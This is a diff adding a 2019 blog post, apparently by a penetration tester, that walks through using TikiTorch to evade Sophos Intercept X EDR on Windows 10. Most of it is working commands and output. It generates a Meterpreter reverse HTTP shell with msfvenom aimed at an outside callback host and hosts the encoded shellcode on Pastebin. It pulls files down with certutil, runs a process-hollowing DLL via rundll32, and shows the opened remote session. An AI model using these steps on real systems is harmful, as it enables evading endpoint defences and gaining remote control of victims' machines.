@@ -1,0 +1,262 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Lighting the path through EDRs using TikiTorch // RythmStick</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.47.1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="RythmStick" />
+    <meta name="description" content="" />
+    <base href="http://www.rythmstick.net" />
+    <link rel="stylesheet" href="http://www.rythmstick.net/css/main.min.13eb48bb7c9a6423f893a6444070cabd7a257bb41b0ffe018d2d2142d741553b.css" />
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="/"><img class="app-header-avatar" src="./me.png" /></a>
+      <h1>RythmStick</h1>
+      <p>Application Penetration Tester, Beginner Bug Bounty Hunter.</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/RythmStick"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/_RythmStick"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Lighting the path through EDRs using TikiTorch</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 3, 2019
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div><div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+          </div></div>
+    </header>
+    <div class="post-content">
+      
+
+<h3 id="intro">Intro</h3>
+
+<p>A quick practical demonstration of using <a href="https://twitter.com/_RastaMouse">Rastamouse&rsquo;s</a> <a href="https://github.com/rasta-mouse/TikiTorch">TikiTorch</a> to bypass Endpoint protection, in this case a trial version of Sophos Intercept X (&ldquo;Now with EDR&rdquo;). For this demo we&rsquo;ll be trying to run a 64 bit staged meterpreter reverse shell on a Windows 10 target.</p>
+
+<p>Before we start, we&rsquo;ll try to do it the old way to see how far we can get. Let&rsquo;s generate a windows binary, download it using a browser and run it.
+<br>
+<br>
+Generate our binary:
+<br>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"> 
+root@localhost:~# msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST=ahost.rythmstick.net LPORT=80 -f exe &gt; rs.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 605 bytes
+Final size of exe file: 7168 bytes
+ </code></pre></div>
+<br></p>
+
+<p>These days, this is is a well recognised binary:</p>
+
+<p><img src="vt.png" alt="screenshot" />
+<br>
+<br></p>
+
+<p>We spin up a web server:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"> 
+root@kali:~# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+ </code></pre></div>
+<br>
+And download <a href="http://ahost.rythmstick.net/rs.exe">http://ahost.rythmstick.net/rs.exe</a> in our browser. If you&rsquo;re lucky enough to get it through your proxy server, Sophos Web Protection recognises it as malicious:</p>
+
+<p><img src="Sophos_Block.png" alt="screenshot" /></p>
+
+<p><br>
+Rather than obfuscate the code we&rsquo;ll download it outside the browser. We&rsquo;ll use a much underrated native windows binary, CERTUTIL.EXE (shout out to  <a href="https://lolbas-project.github.io/#">Lolbas</a>).</p>
+
+<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"> 
+C:\Users\Me&gt; certutil -urlcache -split -f http://ahost.rythmstick.net/rs.exe
+****  Online  ****
+ 000000  ...
+ 034400
+CertUtil: -URLCache command completed successfully.
+ </code></pre></div>
+<br>
+The binary gets downloaded but is immediately dealt with by Sophos Endpoint when it lands on disk:</p>
+
+<p><img src="Sophos_Block2.png" alt="screenshot" />
+<br>
+<br>
+A look at Sophos&rsquo;s threat analysis center gives some additonal details:
+<br>
+<br>
+<img src="analysis.png" alt="screenshot" />
+<br>
+<br>
+We could go through the long process of using different techniques to obfuscate the code, but instead we&rsquo;ll use TikiTorch.
+TikiTorch hides our shellcode using process hollowing techniques to injest the code in a Windows binary of our choice.</p>
+
+<p><br></p>
+
+<h3 id="step-1-generate-shellcode">Step 1 - Generate Shellcode</h3>
+
+<p>We&rsquo;re using msfvenom in Kali 2018.4 to generate some staged reverse shell shellcode and base64 encode it - the format expected by TikiTorch. Oh, we&rsquo;ll also have to gzip the shellcode since the latest mods to TikiTorch (although we don&rsquo;t save alot of bytes gzip&rsquo;ing a stager).
+<br><br>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"> 
+root@localhost:~# msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST=ahost.rythmstick.net LPORT=80 -f raw | gzip -f | base64 -w 0 &gt; rs.txt
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 781 bytes
+  </code></pre></div></p>
+
+<p><code>base64 -w 0 ensures that the base64 encoded shellcode is output in one long string and not wrapped</code><br>
+<code>LHOST is where we'll run our multi handler</code><br>
+<code>LPORT is the port we'll be listening on</code><br></p>
+
+<p><br></p>
+
+<h3 id="step-2-host-our-shellcode">Step 2 - Host our shellcode</h3>
+
+<p>We now need to host our shellcode somewhere. We could spin up a web server but we&rsquo;re going to use this host to run our handler. If the target has tight Egress controls in place we may also be limited by ports. Instead we&rsquo;ll use <a href="https://pastebin.com">PasteBin</a>. We&rsquo;ll copy the contents of rs.txt in a new paste. Make a note of the raw URL for this paste, in our case it&rsquo;s <a href="https://pastebin.com/raw/Zd5hmeUL">https://pastebin.com/raw/Zd5hmeUL</a>.</p>
+
+<p>Make sure we can access this URL on our target.</p>
+
+<p><br></p>
+
+<h3 id="step-3-recompile-tikithings-dll">Step 3 - Recompile TikiThings.dll</h3>
+
+<p>Clone the TikiTorch <a href="https://github.com/rasta-mouse/TikiTorch">Repo</a>. We&rsquo;ll need to amend 2 strings in TikiThings\Program.cs, binary and url, as follows::</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"> 
+string binary = @&#34;c:\\windows\\system32\\calc.exe&#34;;
+string url = @&#34;https://pastebin.com/raw/Zd5hmeU&#34;;
+ </code></pre></div>
+
+<p>Next we need to re-compile, which should generate an updated TikiThings.dll. I used Microsoft Visual Studio Community 2017.</p>
+
+<p><br></p>
+
+<h3 id="step-4-download-tikithings-to-target">Step 4 - Download TikiThings to target</h3>
+
+<p>Download your re-compiled TikiThings.dll to the target.  If your target&rsquo;s web filter objects to downloading a DLL file, try encoding it.</p>
+
+<p>Once compiled, Base64 encode TikiThings.dll:</p>
+
+<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"> 
+C:\&gt; certutil -encode TikiThings.dll TikiThings.enc
+ </code></pre></div>
+<br></p>
+
+<p>Upload the encoded file where it can be downloaded. We&rsquo;ll use pastebin again. Copy the contents of TikiThings.enc into a new paste, in our case <a href="https://pastebin.com/raw/SAeR96bC">https://pastebin.com/raw/SAeR96bC</a>.</p>
+
+<p>Download the encoded file onto target and decode it back to DLL.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"> 
+C:\&gt; certutil -urlcache -split -f https://pastebin.com/raw/SAeR96bC TikiThings.enc
+C:\&gt; certutil -decode TikiThings.enc TikiThings.dll
+ </code></pre></div></p>
+
+<p><br></p>
+
+<h3 id="step-5-start-a-multi-handler">Step 5 - Start a Multi Handler</h3>
+
+<p>Run a Metasploit multi handler to catch our meterpreter reverse http shell.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"> 
+root@localhost:~# msfconsole -q
+msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_http
+payload =&gt; windows/meterpreter_reverse_http
+msf5 exploit(multi/handler) &gt; set LHOST 0.0.0.0
+LHOST =&gt; 0.0.0.0
+msf5 exploit(multi/handler) &gt; set LPORT 80
+LPORT =&gt; 80
+msf5 exploit(multi/handler) &gt; run
+
+[*] Started HTTP reverse handler on http://0.0.0.0:80
+ </code></pre></div>
+
+<p><br></p>
+
+<h3 id="step-6-execute-our-payload">Step 6 - Execute our payload</h3>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">   
+C:\Users\Me&gt; rundll32 TikiThings.dll,EntryPoint
+ </code></pre></div>
+
+<p><br>
+We now get a reverse http meterpreter shell on our target (not a peep from our EDR solution):</p>
+
+<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"> 
+[*] Started HTTP reverse handler on http://0.0.0.0:80
+msf5 exploit(multi/handler) &gt; [*] http://0.0.0.0:80 handling request from x.x.x.x; (UUID: ivbuf5og) Staging x64 payload (207449 bytes) ...
+[*] Meterpreter session 1 opened (178.79.162.12:80 -&gt; x.x.x.x:51614) at 2019-03-25 20:44:26 +0000
+
+msf5 exploit(multi/handler) &gt; sysinfo
+
+meterpreter &gt; sysinfo
+Computer        : DESKTOP-RF1LQOM
+OS              : Windows 10 (Build 17134).
+Architecture    : x64
+System Language : en_GB
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+ </code></pre></div>
+<br>
+If we check out the connections established to our handler, we see a process with PID 4436.</p>
+
+<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"> 
+C:\Users\Me&gt; netstat -ano | find &#34;178.79.162.12&#34;
+  TCP    10.0.2.15:56328      178.79.162.12:80        ESTABLISHED     4436
+ </code></pre></div>
+<br>
+Which happens to be the binary we set in TikiThings.dll:</p>
+
+<p><img src="calc.png" alt="screenshot" /></p>
+
+<p><br>
+TikiTorch has a number of other assemblies. Check out the GitHub <a href="https://rastamouse.me/2019/03/tikitorch">Repo</a> for more details.</p>
+
+    </div>
+    <br><br><br><br>
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "rythmstick" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  </article>
+
+    </main>
+  </body>
+</html>
